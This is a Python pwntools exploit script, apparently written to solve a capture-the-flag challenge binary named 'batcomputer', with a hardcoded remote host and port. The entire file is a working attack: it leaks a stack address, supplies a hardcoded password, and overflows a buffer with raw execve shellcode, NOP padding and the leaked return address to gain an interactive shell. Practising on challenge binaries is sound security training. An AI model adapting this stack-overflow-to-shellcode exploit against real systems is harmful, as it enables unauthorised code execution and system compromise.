#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = ELF("./batcomputer", checksec=False)

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Set the binary context
context.binary = exe

# Offset between buffer and return instruction pointer
offset = 137 
return_address_offset = 84
max_payload_length = 137

# Specify your GDB script here for debugging
gdbscript = '''
init-gef
continue
'''.format(**locals())

def conn():
    if args.REMOTE:
        p = remote("138.68.139.144", 32577)
    else:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)

    return p

def main():

    #p = process("nc")
    p = conn()
    #p.sendline("165.232.42.197 31713" )

    # Step 0:
    # Enumerate the binary
    password = "b4tp@$$w0rd!"
    return_address_offset = 84

    # Step 1:
    # Leak the vulnerable stack address:
    p.sendlineafter('> ', '1')
    leak = p.recvline()
    leak = leak.strip(b"It was very hard, but Alfred managed to locate him: ")
    leak = leak.strip(b"\n")
    log.debug(f"{leak=}")

    # Convert leaked address to an int:
    stack_address = int(leak, 16)

    # Ensure the address is 8 bytes:
    #stack_address = stack_address.rjust(8, '\x00')

    log.success(f"Leaked stack address: {stack_address}")

    # Step 2:
    # Buffer overflow
    p.sendlineafter('> ', '2')
    p.sendlineafter('password: ', password)

    # Build shellcode
    #shellcode = asm(shellcraft.popad() + shellcraft.sh())
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    # payload = b"".join([
    #     shellcode,
    #     asm('nop') * (return_address_offset - len(shellcode)),
    #     p64(stack_address)
    # ])
    # padding = asm('nop')*return_address_offset
    # payload = padding + p64(stack_address + return_address_offset + 8) + shellcode

    payload = shellcode
    payload += asm('nop')*(84 - len(shellcode))
    payload += p64(stack_address)

    assert len(payload) <= max_payload_length, f"payload {len(payload)} too long. Allowed: {max_payload_length}"

    p.sendlineafter('commands: ', payload)

    # Step 3 
    # Trigger return
    p.sendlineafter('> ', '3')

    p.interactive()

    # # Send string to overflow buffer
    # # io.sendlineafter(b'? ', payload)
    # # io.interactive()

    # #p.sendlineafter(b'name? ', payload)
    # # print(p.recvline())
    # p.send(payload)
    # print(p.recvline())
    # print(p.recvline())
    # #print(p.recvall().decode())

if __name__ == '__main__':
    main()